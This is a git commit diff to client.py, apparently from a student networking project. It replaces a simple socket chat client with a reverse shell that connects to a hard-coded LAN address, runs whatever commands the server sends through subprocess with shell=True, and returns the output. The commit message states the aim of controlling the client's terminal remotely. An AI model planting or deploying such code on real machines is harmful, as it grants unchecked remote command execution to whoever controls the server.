30e21a49ad11efa9903d3373791de7306ed2084e
Aoife Walshe <151844043+awalshe02@users.noreply.github.com>
2024-03-21 23:55:36 +0000

    Update client.py
    With this client file you should be able to control client terminal using command like dir, cd ... etc using the server file too

--- client.py
+++ client.py
@@ -1,25 +1,25 @@
 import socket
+import os #for operating system
+import subprocess  #for processes that are on a windows laptop
 
-# Function to connect to the server (peer) and send a message
-def connect_to_server(server_address):
-    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # Ipv4 and tcp connection
-    client_socket.connect(server_address)
+socket = socket.socket()
+host = "172.27.107.120" #ip address of server (use ifconfig/ipconfig to get it)
+port = 1200 
 
-    while True:
-        print("Send message or type 'bye' to end connection: ")
-        message = input()
+socket.connect((host, port)) #to establish connection
 
-        if message.lower() == 'bye':
-            break 
+while True:
+    data = socket.recv(1024)
+    if data[:2].decode("utf-8") == 'cd': #decodes from byte into string then takes first two characters
+        os.chdir(data[3:].decode("utf-8")) #getting characters after 3rd character for change in directory command
 
-        client_socket.send(message.encode())
-        response = client_socket.recv(1024)
-        print(f"Response from server: {response.decode()}")
-    client_socket.close()
+    if len(data) > 0:
+        #Popen will open up a process to execute (inside), gives access to shell commands (like dir)
+        command = subprocess.Popen(data[:].decode("utf-8"), shell=True, stdout = subprocess.PIPE, stdin = subprocess.PIPE, stderr = subprocess.PIPE)
+        output_byte = command.stdout.read() + command.stderr.read()
+        output_string = str(output_byte, "utf-8")
 
+        current = os.getcwd() + "> " #getting the current working directory and formating it (the "> ")
+        socket.send(str.encode(output_string))
 
-# Example usage
-if __name__ == "__main__":
-    server_address = ('172.27.107.120', 1200)  # Change depending on address
-    #message = "Hi from this client!"
-    connect_to_server(server_address)
+        print(output_string)
